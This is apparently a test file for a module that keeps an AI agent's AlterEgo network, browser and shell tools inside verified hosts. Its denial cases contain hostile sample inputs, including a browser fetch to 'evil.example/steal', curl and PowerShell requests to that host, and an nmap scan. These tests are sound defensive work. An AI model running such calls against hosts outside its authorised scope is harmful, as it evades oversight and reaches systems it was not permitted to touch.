// Scope rules for the ae_ tools. These are the checks that stop an agent from using AlterEgo tools to reach
// hosts outside the verified scope. Every case that must be refused is listed next to one that must pass.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { alterEgoScopeDecision, catalogName, urlHosts, AE_PREFIX } from '../../src/alterego-scope.mjs'

// Only one domain is verified. Everything else is unverified.
const verifier = { isVerified: async (domain) => domain === 'verified-lab.example' }
const decide = (name, args) => alterEgoScopeDecision({ name, arguments: args }, verifier)

test('the prefix is stripped only from ae_ names', () => {
  assert.equal(AE_PREFIX, 'ae_')
  assert.equal(catalogName('ae_web_fetch'), 'web_fetch')
  assert.equal(catalogName('web_fetch'), 'web_fetch')
})

test('network tools: unverified hosts are refused, loopback and verified hosts pass', async () => {
  assert.equal((await decide('ae_web_fetch', { url: 'https://evil.example/x' })).kind, 'deny')
  assert.equal((await decide('ae_web_fetch', { url: 'http://127.0.0.1:8080/' })).kind, 'allow')
  assert.equal((await decide('ae_web_fetch', { url: 'http://localhost/' })).kind, 'allow')
  assert.equal((await decide('ae_web_fetch', { url: 'https://verified-lab.example/' })).kind, 'allow')
  assert.equal((await decide('ae_http_headers', { url: 'https://evil.example/' })).kind, 'deny')
})

test('DNS and TCP checks are refused for unverified names and public IPs', async () => {
  assert.equal((await decide('ae_dns_query', { domain: 'evil.example', rtype: 'A' })).kind, 'deny')
  assert.equal((await decide('ae_dns_query', { domain: 'verified-lab.example' })).kind, 'allow')
  assert.equal((await decide('ae_tcp_check', { host: '8.8.8.8', ports: [443] })).kind, 'deny')
  assert.equal((await decide('ae_tcp_check', { host: '127.0.0.1', ports: [22] })).kind, 'allow')
})

test('browser and CDP navigation are checked on their URL, nested or not', async () => {
  assert.equal((await decide('ae_cdp_navigate', { url: 'https://evil.example' })).kind, 'deny')
  assert.equal((await decide('ae_browser', { operation: 'navigate', args: { url: 'https://evil.example' } })).kind, 'deny')
  assert.equal((await decide('ae_browser', { operation: 'navigate', args: { url: 'https://verified-lab.example' } })).kind, 'allow')
  assert.equal((await decide('ae_cdp_launch', { start_url: 'https://evil.example' })).kind, 'deny')
})

test('a URL inside JavaScript sent to the browser is still checked', async () => {
  const js = "fetch('https://evil.example/steal')"
  assert.equal((await decide('ae_browser_eval', { js })).kind, 'deny')
  assert.equal((await decide('ae_cdp_evaluate', { js })).kind, 'deny')
})

test('web_search is allowed when the query names no host (it does not contact the target)', async () => {
  assert.equal((await decide('ae_web_search', { query: 'nmap tutorial' })).kind, 'allow')
})

test('shell tools: a URL or a public IP in the command line is checked', async () => {
  assert.equal((await decide('ae_shell_exec', { command: 'curl https://evil.example/' })).kind, 'deny')
  assert.equal((await decide('ae_shell_exec', { command: 'ping 8.8.8.8' })).kind, 'deny')
  assert.equal((await decide('ae_shell_exec', { command: 'curl https://verified-lab.example/' })).kind, 'allow')
  assert.equal((await decide('ae_shell_pwsh', { script: 'Invoke-WebRequest http://evil.example' })).kind, 'deny')
})

test('shell tools: scanner names keep the scanner rules (bare domain must be verified)', async () => {
  assert.equal((await decide('ae_shell_exec', { command: 'nmap evil.example' })).kind, 'deny')
  assert.equal((await decide('ae_shell_exec', { command: 'nmap 127.0.0.1' })).kind, 'allow')
  assert.equal((await decide('ae_exec', { operation: 'run', command: 'nmap evil.example' })).kind, 'deny')
})

test('a filename in a shell line is not mistaken for a host', async () => {
  assert.equal((await decide('ae_shell_exec', { command: 'dir C:\\Users\\Cho-zen\\notes.txt' })).kind, 'allow')
})

test('batch: a nested call to an unverified host is refused; nested local reads pass', async () => {
  const bad = { calls: [{ tool: 'web_fetch', args: { url: 'https://evil.example' } }] }
  const good = { calls: [{ tool: 'read_file', args: { path: 'C:\\a\\b.md' } }] }
  assert.equal((await decide('ae_batch', bad)).kind, 'deny')
  assert.equal((await decide('ae_batch', good)).kind, 'allow')
})

test('batch: a scanner named with no target is refused', async () => {
  assert.equal((await decide('ae_batch', { calls: [{ tool: 'shell_exec', args: { command: 'nmap' } }] })).kind, 'deny')
})

test('local tools are never refused by the AlterEgo rules', async () => {
  assert.equal((await decide('ae_write_file', { path: 'C:\\x.txt', content: 'https://evil.example' })).kind, 'allow')
  assert.equal((await decide('ae_mouse_click', { x: 1, y: 2 })).kind, 'allow')
  assert.equal((await decide('read_file', { path: 'x' })).kind, 'allow')
})

test('urlHosts reads only http(s) URLs, strips userinfo and ports, and handles IPv6', () => {
  assert.deepEqual(urlHosts(['see https://user:pw@evil.example:8443/p and http://[::1]:80/']).sort(), ['::1', 'evil.example'])
  assert.deepEqual(urlHosts(['no urls in plain.text here']), [])
})

test('a broken verifier fails closed', async () => {
  const broken = { isVerified: async () => { throw new Error('store unreadable') } }
  const d = await alterEgoScopeDecision({ name: 'ae_web_fetch', arguments: { url: 'https://verified-lab.example' } }, broken)
  assert.equal(d.kind, 'deny')
})
